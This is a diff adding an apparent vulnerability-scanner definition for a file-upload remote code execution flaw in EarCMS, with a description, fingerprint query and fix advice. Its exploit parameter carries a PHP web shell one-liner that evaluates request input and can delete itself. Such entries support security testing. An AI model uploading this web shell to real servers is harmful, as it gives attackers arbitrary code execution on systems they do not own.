@@ -1,0 +1,41 @@
+{
+  "Name": "EarCMS index-uplog.php File Upload GetShell",
+  "Description": "Ear CMS is a content management system. There is a Code Execution Vulnerability in the ear distribution foreground. By constructing malicious code, the attacker can obtain the permission of the server.",
+  "Product": "earcms",
+  "Homepage": "https://gobies.org/",
+  "DisclosureDate": "2021-06-09",
+  "Author": "gobysec@gmail.com",
+  "GobyQuery": "body=\"icon-comma\"",
+  "Level": "3",
+  "Impact": "<p>As a result, hackers can upload malicious files to the server to obtain the server permissions.<br></p>",
+  "Recommendation": "<p>1. The execution permission is disabled in the storage directory of the uploaded file.</p><p>2. File suffix white list.</p><p>3. Upgrade to the latest version.</p>",
+  "References": [
+    "https://zhuanlan.zhihu.com/p/81934322"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "<?php @eval($_REQUEST[1]); if($_GET['act']=='del'){unlink(__FILE__);}?>"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": null,
+  "ExploitSteps": null,
+  "Tags": [
+    "File Upload"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
